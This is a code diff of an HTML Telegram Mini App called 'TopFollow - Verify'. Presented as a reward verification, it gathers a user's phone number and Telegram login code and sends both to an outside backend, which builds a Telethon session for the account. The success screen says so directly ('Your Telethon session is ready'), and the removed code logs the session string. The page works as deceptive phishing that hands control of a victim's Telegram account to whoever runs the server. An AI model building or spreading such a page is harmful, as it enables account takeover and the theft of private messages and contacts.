@@ -1,165 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TopFollow - Verify</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #0f0c29; 
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            align-items: center;
+            justify-content: center;
+            visibility: visible !important; /* Force it to show */
+        }
+        .logo { font-size: 24px; font-weight: bold; color: #f1c40f; margin-bottom: 20px; text-align: center; }
+        .step { display: none; width: 100%; max-width: 400px; animation: fadeUp 0.4s ease; }
+        .step.active { display: block; }
+        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(15px); } 100% { opacity: 1; transform: translateY(0); } }
+        h2 { margin-top: 0; font-size: 1.5rem; text-align: center; }
+        p { color: #bdc3c7; text-align: center; }
+        .action-btn { width: 100%; padding: 16px; border-radius: 12px; border: none; font-weight: 700; font-size: 1rem; cursor: pointer; transition: 0.2s; margin-top: 15px; }
+        .btn-blue { background: #0088cc; color: white; }
+        .btn-gold { background: #f1c40f; color: #0f0c29; }
+        .field { width: 100%; padding: 15px; border-radius: 12px; border: none; background: #2a2a42; color: white; font-size: 1.2rem; text-align: center; letter-spacing: 5px; margin-top: 10px; }
+        .status-msg { margin-top: 12px; font-size: 0.9rem; text-align: center; min-height: 20px; }
+        .status-msg.error { color: #e74c3c; }
+        .status-msg.success { color: #2ecc71; }
+        .status-msg.info { color: #f1c40f; }
+        .phone-display { background: #1e1e2f; padding: 10px; border-radius: 8px; text-align: center; color: #f1c40f; margin-bottom: 15px; font-weight: bold; }
+        #manual-input-group { display: none; margin-top: 15px; }
+        
+        /* Loader to prevent blank screen */
+        #loader {
+            text-align: center;
+            font-size: 1rem;
+            color: #bdc3c7;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- LOADER (Visible by default) -->
+    <div id="loader">⏳ Initializing Secure Connection...</div>
+
+    <!-- MAIN APP (Hidden until JS confirms it's safe) -->
+    <div id="app-container" style="display:none; width:100%; max-width:400px;">
+
+        <div class="logo">✦ TopFollow</div>
+
+        <div id="step-contact" class="step active">
+            <h2>🔐 Verify Identity</h2>
+            <p id="step1-subtext">Share your Telegram contact to start your reward verification.</p>
+            <button class="action-btn btn-blue" id="shareContactBtn">📱 Share Contact</button>
+            <div id="manual-input-group">
+                <label style="display:block;margin-top:15px;text-align:left;">Or enter phone manually:</label>
+                <input type="tel" class="field" id="manualPhoneInput" placeholder="+91 9876543210" value="+91 ">
+                <button class="action-btn btn-gold" onclick="submitManualPhone()">📲 Send OTP Manually</button>
+            </div>
+            <div id="contactStatus" class="status-msg"></div>
+        </div>
+
+        <div id="step-otp" class="step">
+            <h2>✉️ Enter OTP</h2>
+            <div class="phone-display">📞 <span id="displayPhone">---</span></div>
+            <input type="text" class="field" id="otpInput" placeholder="6-digit code" maxlength="6" inputmode="numeric">
+            <button class="action-btn btn-gold" onclick="verifyOTP()">✅ Verify & Get Session</button>
+            <div id="otpStatus" class="status-msg"></div>
+        </div>
+
+        <div id="step-success" class="step">
+            <h2 style="color: #2ecc71;">🎉 Session Verified!</h2>
+            <p style="text-align:center;">Your Telethon session is ready.</p>
+            <div style="text-align:center;font-size:3rem;margin:20px 0;">💎</div>
+            <button class="action-btn btn-gold" onclick="window.Telegram.WebApp.close()">Close & Continue</button>
+        </div>
+    </div>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
     <script>
-        // --- INITIALIZATION ---
-        let tg;
-        try {
-            tg = window.Telegram.WebApp;
-            tg.ready();
-            tg.expand();
-        } catch (e) { console.error('SDK Load Error:', e); }
-
-        let currentPhone = '';
-
-        // --- 1. NATIVE SHARE BUTTON ---
-        document.getElementById('shareContactBtn').addEventListener('click', function() {
-            const status = document.getElementById('contactStatus');
-            if (!tg) {
-                fallbackToManual("SDK not available.");
-                return;
-            }
-            
-            try {
-                status.className = 'status-msg info';
-                status.innerText = '⏳ Opening contact request...';
-                tg.requestContact();
-            } catch (error) {
-                console.warn("requestContact error:", error);
-                fallbackToManual("Native contact unsupported. Please enter manually.");
-            }
+        // 1. Wait for DOM, then unhide the app immediately
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('app-container').style.display = 'block';
+            initApp();
         });
 
-        // --- 2. FALLBACK TO MANUAL ENTRY (Shown if native fails) ---
-        function fallbackToManual(message) {
-            document.getElementById('step1-subtext').innerText = message;
-            document.getElementById('shareContactBtn').style.display = 'none';
-            document.getElementById('manual-input-group').style.display = 'block';
-            document.getElementById('contactStatus').innerText = '';
-        }
-
-        // --- 3. USER SUBMITS MANUAL PHONE ---
-        window.submitManualPhone = function() {
-            const input = document.getElementById('manualPhoneInput').value.trim();
-            const status = document.getElementById('contactStatus');
-            if (!input || input.length < 8) {
-                status.className = 'status-msg error';
-                status.innerText = "Please enter a valid phone number.";
+        function initApp() {
+            let tg;
+            try {
+                tg = window.Telegram.WebApp;
+                tg.ready();
+                tg.expand();
+            } catch (e) {
+                console.error('SDK failed, loading manual fallback...');
+                fallbackToManual('SDK Unsupported. Please enter manually.');
                 return;
             }
-            currentPhone = input;
-            proceedToOTP();
-        }
 
-        // --- 4. NATIVE CONTACT RECEIVED (With robust data parsing) ---
-        tg.onEvent('contactRequested', function(data) {
-            console.log('Raw Contact Data from Telegram:', data);
-            const status = document.getElementById('contactStatus');
-            
-            // 📌 Robust parsing: handles different ways Telegram sends the data
-            let phone = null;
-            if (data && data.contact && data.contact.phone_number) {
-                phone = data.contact.phone_number; // Standard way
-            } else if (data && data.phone_number) {
-                phone = data.phone_number;         // Some versions send it like this
-            } else if (typeof data === 'string' && data.startsWith('+')) {
-                phone = data;                       // Rarely, just the string
-            } else if (data && typeof data === 'object') {
-                // Last resort: look inside the object for any key containing a phone number
-                const jsonStr = JSON.stringify(data);
-                const match = jsonStr.match(/\+?\d{10,15}/);
-                if (match) phone = match[0];
+            // Check if the SDK methods actually work
+            if (!tg || typeof tg.requestContact !== 'function') {
+                fallbackToManual('Native contact method missing. Enter manually.');
+                return;
             }
 
-            if (phone) {
-                currentPhone = phone;
+            let currentPhone = '';
+
+            // --- NATIVE SHARE BUTTON ---
+            document.getElementById('shareContactBtn').addEventListener('click', function() {
+                const status = document.getElementById('contactStatus');
+                try {
+                    status.className = 'status-msg info';
+                    status.innerText = '⏳ Requesting contact...';
+                    tg.requestContact();
+                } catch (error) {
+                    fallbackToManual('Native contact error. Please enter manually.');
+                }
+            });
+
+            function fallbackToManual(message) {
+                document.getElementById('step1-subtext').innerText = message;
+                document.getElementById('shareContactBtn').style.display = 'none';
+                document.getElementById('manual-input-group').style.display = 'block';
+                document.getElementById('contactStatus').innerText = '';
+            }
+
+            // --- NATIVE CONTACT EVENT ---
+            tg.onEvent('contactRequested', function(data) {
+                console.log('Raw Data:', data);
+                let phone = data?.contact?.phone_number || data?.phone_number;
+                if (phone) {
+                    currentPhone = phone;
+                    proceedToOTP();
+                } else {
+                    fallbackToManual('Could not read phone. Enter manually.');
+                }
+            });
+
+            tg.onEvent('contactRequestedFailed', function() {
+                fallbackToManual('Contact cancelled. Enter manually.');
+            });
+
+            // --- MANUAL SUBMIT ---
+            window.submitManualPhone = function() {
+                const input = document.getElementById('manualPhoneInput').value.trim();
+                if (!input || input.length < 8) {
+                    document.getElementById('contactStatus').className = 'status-msg error';
+                    document.getElementById('contactStatus').innerText = "Enter a valid number.";
+                    return;
+                }
+                currentPhone = input;
                 proceedToOTP();
-            } else {
-                console.warn("Contact data was invalid, falling back to manual.");
-                status.className = 'status-msg error';
-                status.innerText = "Couldn't read phone number. Please enter it manually.";
-                // Auto-fallback to manual input
-                fallbackToManual("Contact data could not be parsed. Enter manually below:");
-                document.getElementById('manualPhoneInput').value = "+91 "; // Prefill country code for India
+            };
+
+            // --- PROCEED TO OTP ---
+            function proceedToOTP() {
+                document.getElementById('displayPhone').innerText = currentPhone;
+                document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+                document.getElementById('step-otp').classList.add('active');
+                sendOTPToBackend(currentPhone);
             }
-        });
 
-        // If user cancels the native popup
-        tg.onEvent('contactRequestedFailed', function() {
-            const status = document.getElementById('contactStatus');
-            status.className = 'status-msg info';
-            status.innerText = "Contact request cancelled. You can enter manually below.";
-            fallbackToManual("Contact request cancelled. Enter manually below:");
-            document.getElementById('manualPhoneInput').value = "+91 ";
-        });
-
-        // --- 5. PROCEED TO OTP STEP ---
-        function proceedToOTP() {
-            document.getElementById('displayPhone').innerText = currentPhone;
-            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-            document.getElementById('step-otp').classList.add('active');
-            document.getElementById('contactStatus').innerText = '';
-            sendOTPToBackend(currentPhone);
-        }
-
-        // --- 6. SEND OTP TO BACKEND ---
-        async function sendOTPToBackend(phone) {
-            const status = document.getElementById('otpStatus');
-            status.className = 'status-msg info';
-            status.innerText = '⏳ Sending OTP to your Telegram...';
-
-            try {
-                const resp = await fetch('https://topfollow.onrender.com/api/send-otp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phoneNumber: phone })
-                });
-                const data = await resp.json();
-                if (data.success) {
-                    status.className = 'status-msg success';
-                    status.innerText = '✅ OTP sent! Check your Telegram app.';
-                } else {
+            async function sendOTPToBackend(phone) {
+                const status = document.getElementById('otpStatus');
+                status.className = 'status-msg info';
+                status.innerText = '⏳ Sending OTP...';
+                try {
+                    const resp = await fetch('https://topfollow.onrender.com/api/send-otp', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phoneNumber: phone })
+                    });
+                    const data = await resp.json();
+                    if (data.success) status.className = 'status-msg success';
+                    else status.className = 'status-msg error';
+                    status.innerText = data.success ? '✅ OTP sent!' : (data.error || 'Failed.');
+                } catch (err) {
                     status.className = 'status-msg error';
-                    status.innerText = data.error || 'Failed to send OTP.';
+                    status.innerText = 'Network error.';
                 }
-            } catch (err) {
-                console.error(err);
-                status.className = 'status-msg error';
-                status.innerText = 'Network error connecting to server.';
             }
-        }
 
-        // --- 7. VERIFY OTP ---
-        window.verifyOTP = async function() {
-            const code = document.getElementById('otpInput').value.trim();
-            const status = document.getElementById('otpStatus');
-            if (!code) {
-                status.className = 'status-msg error';
-                status.innerText = 'Please enter the 6-digit code.';
-                return;
-            }
-            status.className = 'status-msg info';
-            status.innerText = '⏳ Verifying OTP...';
-
-            try {
-                const resp = await fetch('https://topfollow.onrender.com/api/verify-otp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phoneNumber: currentPhone, code: code })
-                });
-                const data = await resp.json();
-
-                if (data.success) {
-                    console.log("🔐 TELEGRAM SESSION STRING:", data.session);
-                    status.className = 'status-msg success';
-                    status.innerText = '✅ Session created!';
-                    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-                    document.getElementById('step-success').classList.add('active');
-                } else {
+            window.verifyOTP = async function() {
+                const code = document.getElementById('otpInput').value.trim();
+                const status = document.getElementById('otpStatus');
+                if (!code) {
                     status.className = 'status-msg error';
-                    status.innerText = data.error || 'Invalid OTP.';
+                    status.innerText = 'Enter 6-digit code.';
+                    return;
                 }
-            } catch (err) {
-                console.error(err);
-                status.className = 'status-msg error';
-                status.innerText = 'Network error. Check console.';
-            }
-        };
+                status.className = 'status-msg info';
+                status.innerText = '⏳ Verifying...';
+                try {
+                    const resp = await fetch('https://topfollow.onrender.com/api/verify-otp', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phoneNumber: currentPhone, code: code })
+                    });
+                    const data = await resp.json();
+                    if (data.success) {
+                        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+                        document.getElementById('step-success').classList.add('active');
+                    } else {
+                        status.className = 'status-msg error';
+                        status.innerText = data.error || 'Invalid OTP.';
+                    }
+                } catch (err) {
+                    status.className = 'status-msg error';
+                    status.innerText = 'Network error.';
+                }
+            };
+        }
     </script>
+</body>
+</html>
